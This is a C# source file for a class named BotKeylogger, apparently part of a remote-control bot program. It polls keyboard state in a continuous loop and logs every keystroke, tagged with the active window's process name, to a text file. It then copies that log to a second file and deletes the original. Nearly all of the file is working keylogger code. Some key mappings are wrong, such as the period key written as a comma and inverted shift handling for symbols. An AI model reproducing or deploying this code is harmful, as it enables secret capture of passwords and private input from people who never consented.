using Client;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

using System.Timers;
using System.Windows.Forms;
using System.Windows.Input;

namespace Server
{
    internal class BotKeylogger
    {
        #region Key board
        static WebClient webclient = Program.webClient;
        //private static string logName = "Log_";
        //private static string logExtendtion = ".txt";
        static string pathKeylogger = "keylogger.txt";
        static bool isStarted = false;
        private static DateTime timeStart;
        private static DateTime timeStop;
        private static HashSet<Key> PressedKeysHistory = new HashSet<Key>();
        static System.Timers.Timer timer = new System.Timers.Timer();
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);

        static string activeProcessName = GetActiveWindowProcessName().ToLower();
        static string prevProcessName = activeProcessName;
        static Thread th_doKeylogger;

        public static void initBotKeylogger()
        {
            isStarted = true;
            th_doKeylogger = new Thread(new ThreadStart(DoKeylogger));
            th_doKeylogger.SetApartmentState(ApartmentState.STA);
            th_doKeylogger.Start();
            Console.WriteLine("Start keylogger");

        }
        public static void StartKeylogger()
        {
            isStarted = true;
            using (StreamWriter writer = new StreamWriter(pathKeylogger, false)) 
            {
            }
            Console.WriteLine("Keylogger started.");
        }
        public static void copyFile()
        {
            string sourceFile = pathKeylogger; // Đường dẫn tới tệp nguồn
            string destinationFile = "outputkeylogger.txt"; // Đường dẫn tới tệp đích

            // Mở tệp nguồn để đọc
            using (FileStream sourceStream = new FileStream(sourceFile, FileMode.Open, FileAccess.Read))
            {
                // Mở tệp đích để ghi (nếu tệp đích chưa tồn tại, nó sẽ được tạo)
                using (FileStream destinationStream = new FileStream(destinationFile, FileMode.Create, FileAccess.Write))
                {
                    // Sao chép nội dung từ tệp nguồn sang tệp đích
                    byte[] buffer = new byte[1024];
                    int bytesRead;
                    while ((bytesRead = sourceStream.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        destinationStream.Write(buffer, 0, bytesRead);
                    }
                }
            }
        }
        public static void StopKeylogger()
        {
            isStarted = false;
            Thread.Sleep(500);
            if (File.Exists(pathKeylogger))
            {
                try
                {
                    timeStop = DateTime.Now;
                    copyFile();
                    File.Delete(pathKeylogger);
                    prevProcessName = null;
                }
                catch (Exception)
                {
                    Console.WriteLine("unable to delete keystrokes.txt");
                }
            }

            Console.WriteLine("Keylogger stopped.");
        }
        static bool isHotKey = false;
        static bool isShowing = false;

        private static void DoKeylogger()
        {
            while (true)
            {
                if (!isStarted) continue;
                string keyPressed = GetNewPressedKeys();
                if(!System.IO.File.Exists("keylogger.txt"))
                {
                    using (FileStream fs = File.Create("keylogger.txt"))
                    {
                        Console.WriteLine("Tao keylogger.txt");
                    }
                }    
                
                if (!IsFileInUse(pathKeylogger))
                {
                    using (StreamWriter sw = new StreamWriter(pathKeylogger, true))
                    {
                        activeProcessName = GetActiveWindowProcessName().ToLower();
                        if (activeProcessName == "idle" || activeProcessName == "explorer") continue;
                        bool isOldProcess = activeProcessName.Equals(prevProcessName);
                        if (!isOldProcess && !(string.IsNullOrEmpty(keyPressed)))
                        {
                            sw.WriteLine("\n[--" + activeProcessName + "--]");
                            prevProcessName = activeProcessName;
                        }
                        sw.Write(keyPressed);
                        sw.Close();
                    }
                }
            }
        }
        public static bool IsFileInUse(string filePath)
        {
            try
            {
                using (FileStream fs = new FileStream(filePath, FileMode.Open, FileAccess.ReadWrite, FileShare.None))
                {
                    fs.Close();
                }
                return false;
            }
            catch (IOException)
            {
                return true;
            }
        }
        private static string GetNewPressedKeys()
        {
            string pressedKey = String.Empty;

            foreach (int i in Enum.GetValues(typeof(Key)))
            {
                Key key = (Key)Enum.Parse(typeof(Key), i.ToString());
                bool down = false;
                if (key != Key.None)
                {
                    down = Keyboard.IsKeyDown(key);
                }

                if (!down && PressedKeysHistory.Contains(key))
                    PressedKeysHistory.Remove(key);
                else if (down && !PressedKeysHistory.Contains(key)) //If the key is pressed, but wasn't pressed before - save it
                {

                    if (!isCaps())
                    {
                        PressedKeysHistory.Add(key);
                        pressedKey = key.ToString().ToLower(); //by default it is CAPS
                    }
                    else
                    {
                        PressedKeysHistory.Add(key);
                        pressedKey = key.ToString(); //CAPS
                    }

                }
            }
            return replaceStrings(pressedKey,isCaps());
        }
        private static string replaceStrings(string input,bool cap)
        {
            string replacedKey = input;
            if(!input.Trim().Equals(""))
            {
                Console.WriteLine(input);
            }  
            
            if(input.Equals("space") || input.Equals("Space"))
            {
                replacedKey = " ";
            } 
            else if(input.Equals("return") || input.Equals("Return"))
            {
                replacedKey = "\r\n";
            }
            else if (input.Equals("escape")|| input.Equals("Escape"))
            {
                replacedKey = "[ESC]";
            }
            else if (input.Equals("RightShift") || input.Equals("LeftShift"))
            {
                replacedKey = "[SHIFT]";
            }
            else if (input.Equals("leftctrl") || input.Equals("LeftCtrl")|| input.Equals("rightctrl") || input.Equals("RightCtrl"))
            {
                replacedKey = "[CTRL]";
            }
            else if (input.Equals("leftalt") || input.Equals("LeftAlt") || input.Equals("rightalt") || input.Equals("RightAlt"))
            {
                replacedKey = "[ALT]";
            }
            else if (input.Equals("back") || input.Equals("Back"))
            {
                replacedKey = "[BACK]";
            }
            else if (input.Equals("lwin") || input.Equals("LWin"))
            {
                replacedKey = "[WIN]";
            }
            else if (input.Equals("tab") || input.Equals("Tab"))
            {
                replacedKey = "[TAB]";
            }
            else if (input.Equals("capital") || input.Equals("Capital"))
            {
                replacedKey = "";
            }
            else if (input.Equals("oemcomma"))
            {
                replacedKey = ",";
            }
            else if (input.Equals("OemComma"))
            {
                if(cap == true)
                {
                    replacedKey = ",";
                }
                else
                {
                    replacedKey = "<";
                }
            }
            else if (input.Equals("oemperiod"))
            {
                replacedKey = ",";
            }
            else if (input.Equals("OemPeriod"))
            {
                if (cap == true)
                {
                    replacedKey = ".";
                }
                else
                {
                    replacedKey = ">";
                }
            }
            else if (input.Equals("oemquestion"))
            {
                replacedKey = "/";
            }
            else if (input.Equals("OemQuestion"))
            {
                if (cap == true)
                {
                    replacedKey = "/";
                }
                else
                {
                    replacedKey = "?";
                }
            }
            else if (input.Equals("oem1"))
            {
                replacedKey = ";";
            }
            else if (input.Equals("Oem1"))
            {
                if (cap == true)
                {
                    replacedKey = ";";
                }
                else
                {
                    replacedKey = ":";
                }
            }
            else if (input.Equals("oemquotes"))
            {
                replacedKey = "'";
            }
            else if (input.Equals("OemQuotes"))
            {
                if (cap == true)
                {
                    replacedKey = "'";
                }
                else
                {
                    replacedKey = "\"";
                }
            }
            else if (input.Equals("oemopenbrackets"))
            {
                replacedKey = "["; 
            }
            else if (input.Equals("OemOpenBrackets"))
            {
                if (cap == true)
                {
                    replacedKey = "[";
                }
                else
                {
                    replacedKey = "{";
                }
            }
            else if (input.Equals("oem6"))
            {
                replacedKey = "]";
            }
            else if (input.Equals("Oem6"))
            {
                if (cap == true)
                {
                    replacedKey = "]";
                }
                else
                {
                    replacedKey = "}";
                }
            }
            else if (input.Equals("d1"))
            {
                replacedKey = "1";
            }
            else if (input.Equals("D1"))
            {
                if (cap == true)
                {
                    replacedKey = "1";
                }
                else
                {
                    replacedKey = "!";
                }
            }
            else if (input.Equals("d2"))
            {
                replacedKey = "2";
            }
            else if (input.Equals("D2"))
            {
                if (cap == true)
                {
                    replacedKey = "2";
                }
                else
                {
                    replacedKey = "@";
                }
            }
            else if (input.Equals("d3"))
            {
                replacedKey = "3";
            }
            else if (input.Equals("D3"))
            {
                if (cap == true)
                {
                    replacedKey = "3";
                }
                else
                {
                    replacedKey = "#";
                }
            }
            else if (input.Equals("d4"))
            {
                replacedKey = "4";
            }
            else if (input.Equals("D4"))
            {
                if (cap == true)
                {
                    replacedKey = "4";
                }
                else
                {
                    replacedKey = "$";
                }
            }
            else if (input.Equals("d5"))
            {
                replacedKey = "5";
            }
            else if (input.Equals("D5"))
            {
                if (cap == true)
                {
                    replacedKey = "5";
                }
                else
                {
                    replacedKey = "%";
                }
            }
            else if (input.Equals("d6"))
            {
                replacedKey = "6";
            }
            else if (input.Equals("D6"))
            {
                if (cap == true)
                {
                    replacedKey = "6";
                }
                else
                {
                    replacedKey = "^";
                }
            }
            else if (input.Equals("d7"))
            {
                replacedKey = "7";
            }
            else if (input.Equals("D7"))
            {
                if (cap == true)
                {
                    replacedKey = "7";
                }
                else
                {
                    replacedKey = "&";
                }
            }
            else if (input.Equals("d8"))
            {
                replacedKey = "8";
            }
            else if (input.Equals("D8"))
            {
                if (cap == true)
                {
                    replacedKey = "8";
                }
                else
                {
                    replacedKey = "*";
                }
            }
            else if (input.Equals("d9"))
            {
                replacedKey = "9";
            }
            else if (input.Equals("D9"))
            {
                if (cap == true)
                {
                    replacedKey = "9";
                }
                else
                {
                    replacedKey = "(";
                }
            }
            else if (input.Equals("d0"))
            {
                replacedKey = "0";
            }
            else if (input.Equals("D0"))
            {
                if (cap == true)
                {
                    replacedKey = "0";
                }
                else
                {
                    replacedKey = ")";
                }
            }
            else if (input.Equals("oemminus"))
            {
                replacedKey = "-";
            }
            else if (input.Equals("OemMinus"))
            {
                if (cap == true)
                {
                    replacedKey = "-";
                }
                else
                {
                    replacedKey = "_";
                }
            }
            else if (input.Equals("oemplus"))
            {
                replacedKey = "=";
            }
            else if (input.Equals("OemPlus"))
            {
                if (cap == true)
                {
                    replacedKey = "=";
                }
                else
                {
                    replacedKey = "+";
                }
            }
            else if (input.Equals("oem5"))
            {
                replacedKey = "\\";
            }
            else if (input.Equals("Oem5"))
            {
                if (cap == true)
                {
                    replacedKey = "\\";
                }
                else
                {
                    replacedKey = "|";
                }
            }
            else if (input.Equals("delete")|| input.Equals("Delete"))
            {
                replacedKey = "[DELETE]";
            }
            else if (input.Equals("divide") || input.Equals("Divide"))
            {
                replacedKey = "/";
            }
            else if (input.Equals("divide") || input.Equals("Divide"))
            {
                replacedKey = "/";
            }
            else if (input.Equals("multiply") || input.Equals("Multiply"))
            {
                replacedKey = "*";
            }
            else if (input.Equals("subtract") || input.Equals("Subtract"))
            {
                replacedKey = "-";
            }
            else if (input.Equals("add") || input.Equals("Add"))
            {
                replacedKey = "+";
            }
            else if (input.Equals("decimal") || input.Equals("Decimal"))
            {
                replacedKey = ".";
            }
            else if (input.Equals("numpad0") || input.Equals("NumPad0"))
            {
                replacedKey = "0";
            }
            else if (input.Equals("numpad1") || input.Equals("NumPad1"))
            {
                replacedKey = "1";
            }
            else if (input.Equals("numpad2") || input.Equals("NumPad2"))
            {
                replacedKey = "2";
            }
            else if (input.Equals("numpad3") || input.Equals("NumPad3"))
            {
                replacedKey = "3";
            }
            else if (input.Equals("numpad4") || input.Equals("NumPad4"))
            {
                replacedKey = "4";
            }
            else if (input.Equals("numpad5") || input.Equals("NumPad5"))
            {
                replacedKey = "5";
            }
            else if (input.Equals("numpad6") || input.Equals("NumPad6"))
            {
                replacedKey = "6";
            }
            else if (input.Equals("numpad7") || input.Equals("NumPad7"))
            {
                replacedKey = "7";
            }
            else if (input.Equals("numpad8") || input.Equals("NumPad8"))
            {
                replacedKey = "8";
            }
            else if (input.Equals("numpad9") || input.Equals("NumPad9"))
            {
                replacedKey = "9";
            }
            else
            {

            };
            return replacedKey;
        }

        private static bool isCaps()
        {
            bool isCapsLockOn = Control.IsKeyLocked(Keys.CapsLock);
            bool isShiftKeyPressed = (Keyboard.Modifiers & ModifierKeys.Shift) == ModifierKeys.Shift;
            if (isCapsLockOn || isShiftKeyPressed) return true;
            else return false;
        }

        private static string GetActiveWindowProcessName()
        {
            IntPtr windowHandle = GetForegroundWindow();
            GetWindowThreadProcessId(windowHandle, out uint processId);
            Process process = Process.GetProcessById((int)processId);
            return process.ProcessName;
        }
        #endregion
    }
}
